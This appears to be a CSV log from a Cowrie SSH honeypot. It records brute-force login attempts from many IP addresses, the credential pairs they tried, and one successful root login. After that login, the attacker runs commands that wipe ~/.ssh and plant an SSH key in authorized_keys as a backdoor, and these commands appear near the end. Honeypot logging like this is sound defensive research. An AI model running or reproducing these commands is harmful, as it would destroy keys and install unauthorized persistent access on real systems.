eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.login.failed,109.195.148.73,,,,96307615ccc2,,,,,login attempt [openhabian/openhabian] failed,localhost,2024-11-29T03:39:51.605844Z
cowrie.session.connect,114.206.23.151,59770,172.233.154.19,2222,867baf5a7b68,ssh,,,,New connection: 114.206.23.151:59770 (172.233.154.19:2222) [session: 867baf5a7b68],localhost,2024-11-29T03:39:52.531761Z
cowrie.client.version,114.206.23.151,,,,867baf5a7b68,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:39:52.532303Z
cowrie.client.kex,114.206.23.151,,,,867baf5a7b68,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:39:52.666410Z
cowrie.session.closed,109.195.148.73,,,,96307615ccc2,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:39:52.800762Z
cowrie.login.failed,114.206.23.151,,,,867baf5a7b68,,,,,login attempt [hou/hou] failed,localhost,2024-11-29T03:39:53.247811Z
cowrie.session.closed,114.206.23.151,,,,867baf5a7b68,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:39:54.384726Z
cowrie.session.connect,77.221.158.250,46520,172.233.154.19,2222,207e4e9f65f0,ssh,,,,New connection: 77.221.158.250:46520 (172.233.154.19:2222) [session: 207e4e9f65f0],localhost,2024-11-29T03:40:03.838081Z
cowrie.client.version,77.221.158.250,,,,207e4e9f65f0,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:40:03.840359Z
cowrie.client.kex,77.221.158.250,,,,207e4e9f65f0,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:40:04.040226Z
cowrie.login.failed,77.221.158.250,,,,207e4e9f65f0,,,,,login attempt [transfer/password] failed,localhost,2024-11-29T03:40:04.828420Z
cowrie.session.closed,77.221.158.250,,,,207e4e9f65f0,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:40:06.033634Z
cowrie.session.connect,191.242.105.131,52800,172.233.154.19,2222,eea72c266ace,ssh,,,,New connection: 191.242.105.131:52800 (172.233.154.19:2222) [session: eea72c266ace],localhost,2024-11-29T03:40:38.797225Z
cowrie.client.version,191.242.105.131,,,,eea72c266ace,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:40:38.798025Z
cowrie.client.kex,191.242.105.131,,,,eea72c266ace,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:40:38.973728Z
cowrie.login.failed,191.242.105.131,,,,eea72c266ace,,,,,login attempt [vpn/aa123456] failed,localhost,2024-11-29T03:40:39.717238Z
cowrie.session.connect,74.48.50.48,60242,172.233.154.19,2222,133517e0373d,ssh,,,,New connection: 74.48.50.48:60242 (172.233.154.19:2222) [session: 133517e0373d],localhost,2024-11-29T03:40:40.163234Z
cowrie.client.version,74.48.50.48,,,,133517e0373d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:40:40.163767Z
cowrie.client.kex,74.48.50.48,,,,133517e0373d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:40:40.165015Z
cowrie.login.failed,74.48.50.48,,,,133517e0373d,,,,,login attempt [ubuntu/121212] failed,localhost,2024-11-29T03:40:40.209408Z
cowrie.session.closed,191.242.105.131,,,,eea72c266ace,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:40:40.894921Z
cowrie.session.closed,74.48.50.48,,,,133517e0373d,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:40:41.212335Z
cowrie.session.connect,188.54.231.71,53254,172.233.154.19,2222,a2bffe36f03b,ssh,,,,New connection: 188.54.231.71:53254 (172.233.154.19:2222) [session: a2bffe36f03b],localhost,2024-11-29T03:40:49.939027Z
cowrie.client.version,188.54.231.71,,,,a2bffe36f03b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:40:49.939722Z
cowrie.client.kex,188.54.231.71,,,,a2bffe36f03b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:40:50.164415Z
cowrie.login.failed,188.54.231.71,,,,a2bffe36f03b,,,,,login attempt [touch/touch] failed,localhost,2024-11-29T03:40:51.187467Z
cowrie.session.closed,188.54.231.71,,,,a2bffe36f03b,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:40:52.413815Z
cowrie.session.connect,109.195.148.73,42112,172.233.154.19,2222,b6b15c25f6c7,ssh,,,,New connection: 109.195.148.73:42112 (172.233.154.19:2222) [session: b6b15c25f6c7],localhost,2024-11-29T03:41:01.180295Z
cowrie.client.version,109.195.148.73,,,,b6b15c25f6c7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:41:01.180923Z
cowrie.client.kex,109.195.148.73,,,,b6b15c25f6c7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:41:01.367291Z
cowrie.login.failed,109.195.148.73,,,,b6b15c25f6c7,,,,,login attempt [dhn/123456] failed,localhost,2024-11-29T03:41:02.153587Z
cowrie.session.closed,109.195.148.73,,,,b6b15c25f6c7,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:41:03.342238Z
cowrie.session.connect,77.221.158.250,44518,172.233.154.19,2222,2a66e3db8085,ssh,,,,New connection: 77.221.158.250:44518 (172.233.154.19:2222) [session: 2a66e3db8085],localhost,2024-11-29T03:41:26.624347Z
cowrie.client.version,77.221.158.250,,,,2a66e3db8085,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:41:26.626208Z
cowrie.client.kex,77.221.158.250,,,,2a66e3db8085,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:41:26.831226Z
cowrie.session.connect,114.206.23.151,55650,172.233.154.19,2222,a8d8bf93a35c,ssh,,,,New connection: 114.206.23.151:55650 (172.233.154.19:2222) [session: a8d8bf93a35c],localhost,2024-11-29T03:41:27.643047Z
cowrie.client.version,114.206.23.151,,,,a8d8bf93a35c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:41:27.643659Z
cowrie.login.failed,77.221.158.250,,,,2a66e3db8085,,,,,login attempt [lthpc/123456] failed,localhost,2024-11-29T03:41:27.649263Z
cowrie.client.kex,114.206.23.151,,,,a8d8bf93a35c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:41:27.779239Z
cowrie.login.failed,114.206.23.151,,,,a8d8bf93a35c,,,,,login attempt [acct/acct] failed,localhost,2024-11-29T03:41:28.362683Z
cowrie.session.closed,77.221.158.250,,,,2a66e3db8085,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:41:28.854313Z
cowrie.session.closed,114.206.23.151,,,,a8d8bf93a35c,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:41:29.501132Z
cowrie.session.connect,143.198.9.189,33744,172.233.154.19,2222,972f3b6c95d9,ssh,,,,New connection: 143.198.9.189:33744 (172.233.154.19:2222) [session: 972f3b6c95d9],localhost,2024-11-29T03:41:47.472066Z
cowrie.client.version,143.198.9.189,,,,972f3b6c95d9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:41:47.472586Z
cowrie.client.kex,143.198.9.189,,,,972f3b6c95d9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:41:47.537647Z
cowrie.login.failed,143.198.9.189,,,,972f3b6c95d9,,,,,login attempt [ubuntu/1qaz2wsx!] failed,localhost,2024-11-29T03:41:47.839360Z
cowrie.session.closed,143.198.9.189,,,,972f3b6c95d9,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:41:48.907403Z
cowrie.session.connect,74.48.50.48,58320,172.233.154.19,2222,e322d3f99ef8,ssh,,,,New connection: 74.48.50.48:58320 (172.233.154.19:2222) [session: e322d3f99ef8],localhost,2024-11-29T03:41:57.093773Z
cowrie.client.version,74.48.50.48,,,,e322d3f99ef8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:41:57.094318Z
cowrie.client.kex,74.48.50.48,,,,e322d3f99ef8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:41:57.095234Z
cowrie.login.failed,74.48.50.48,,,,e322d3f99ef8,,,,,login attempt [recording/recording] failed,localhost,2024-11-29T03:41:57.139298Z
cowrie.session.closed,74.48.50.48,,,,e322d3f99ef8,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:41:58.142415Z
cowrie.session.connect,109.195.148.73,36928,172.233.154.19,2222,2fdea74d5471,ssh,,,,New connection: 109.195.148.73:36928 (172.233.154.19:2222) [session: 2fdea74d5471],localhost,2024-11-29T03:42:09.781004Z
cowrie.client.version,109.195.148.73,,,,2fdea74d5471,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:09.781569Z
cowrie.client.kex,109.195.148.73,,,,2fdea74d5471,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:09.971082Z
cowrie.session.connect,216.218.206.69,62200,172.233.154.19,2222,5fd12c7eb46b,ssh,,,,New connection: 216.218.206.69:62200 (172.233.154.19:2222) [session: 5fd12c7eb46b],localhost,2024-11-29T03:42:09.989338Z
cowrie.client.version,216.218.206.69,,,,5fd12c7eb46b,, {  w$_S\xbaw\xa3\xafCW\xf1\x8c\x85Ren\xf3\xd9xgߘ<\xe4\xddL\xecx=  \xc0/\xc0+\xc0\xc0\xc0\xc0	\xc0\xc0,,,Remote SSH version:  {  w$_S\xbaw\xa3\xafCW\xf1\x8c\x85Ren\xf3\xd9xgߘ<\xe4\xddL\xecx=  \xc0/\xc0+\xc0\xc0\xc0\xc0	\xc0\xc0,localhost,2024-11-29T03:42:09.989877Z
cowrie.session.closed,216.218.206.69,,,,5fd12c7eb46b,,,,,Connection lost after 0 seconds,localhost,2024-11-29T03:42:09.990576Z
cowrie.login.failed,109.195.148.73,,,,2fdea74d5471,,,,,login attempt [gong/gong] failed,localhost,2024-11-29T03:42:10.770296Z
cowrie.session.connect,191.242.105.131,50844,172.233.154.19,2222,b5399b166476,ssh,,,,New connection: 191.242.105.131:50844 (172.233.154.19:2222) [session: b5399b166476],localhost,2024-11-29T03:42:11.591934Z
cowrie.client.version,191.242.105.131,,,,b5399b166476,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:11.592477Z
cowrie.client.kex,191.242.105.131,,,,b5399b166476,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:11.769197Z
cowrie.session.closed,109.195.148.73,,,,2fdea74d5471,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:42:11.961558Z
cowrie.session.connect,176.45.29.247,39420,172.233.154.19,2222,0c9f2740c7dc,ssh,,,,New connection: 176.45.29.247:39420 (172.233.154.19:2222) [session: 0c9f2740c7dc],localhost,2024-11-29T03:42:12.133614Z
cowrie.client.version,176.45.29.247,,,,0c9f2740c7dc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:12.134187Z
cowrie.client.kex,176.45.29.247,,,,0c9f2740c7dc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:12.355549Z
cowrie.login.failed,191.242.105.131,,,,b5399b166476,,,,,login attempt [tuan/tuan123] failed,localhost,2024-11-29T03:42:12.514172Z
cowrie.session.closed,191.242.105.131,,,,b5399b166476,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:42:13.692070Z
cowrie.session.connect,77.221.158.250,42514,172.233.154.19,2222,826493429d8a,ssh,,,,New connection: 77.221.158.250:42514 (172.233.154.19:2222) [session: 826493429d8a],localhost,2024-11-29T03:42:46.586226Z
cowrie.client.version,77.221.158.250,,,,826493429d8a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:46.586875Z
cowrie.client.kex,77.221.158.250,,,,826493429d8a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:46.781967Z
cowrie.session.connect,203.121.40.210,55567,172.233.154.19,2222,862afaf59ecd,ssh,,,,New connection: 203.121.40.210:55567 (172.233.154.19:2222) [session: 862afaf59ecd],localhost,2024-11-29T03:42:47.254277Z
cowrie.client.version,203.121.40.210,,,,862afaf59ecd,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:47.254812Z
cowrie.client.kex,203.121.40.210,,,,862afaf59ecd,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:47.451561Z
cowrie.login.failed,77.221.158.250,,,,826493429d8a,,,,,login attempt [vpn/aa123456] failed,localhost,2024-11-29T03:42:47.586155Z
cowrie.login.success,203.121.40.210,,,,862afaf59ecd,,,,,login attempt [root/123qweQAZ] succeeded,localhost,2024-11-29T03:42:48.278065Z
cowrie.session.params,203.121.40.210,,,,862afaf59ecd,,,,,[],localhost,2024-11-29T03:42:48.689748Z
cowrie.command.input,203.121.40.210,,,,862afaf59ecd,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T03:42:48.690145Z
cowrie.command.failed,203.121.40.210,,,,862afaf59ecd,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T03:42:48.690811Z
cowrie.session.closed,77.221.158.250,,,,826493429d8a,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:42:48.777059Z
cowrie.log.closed,203.121.40.210,,,,862afaf59ecd,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T03:42:49.124344Z
cowrie.session.params,203.121.40.210,,,,862afaf59ecd,,,,,[],localhost,2024-11-29T03:42:49.342343Z
cowrie.command.input,203.121.40.210,,,,862afaf59ecd,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T03:42:49.342881Z
cowrie.session.file_download,203.121.40.210,,,,862afaf59ecd,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T03:42:49.541145Z
cowrie.log.closed,203.121.40.210,,,,862afaf59ecd,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T03:42:49.541716Z
cowrie.session.connect,203.121.40.210,58651,172.233.154.19,2222,5ab8013f755f,ssh,,,,New connection: 203.121.40.210:58651 (172.233.154.19:2222) [session: 5ab8013f755f],localhost,2024-11-29T03:42:49.711787Z
cowrie.client.version,203.121.40.210,,,,5ab8013f755f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:49.712345Z
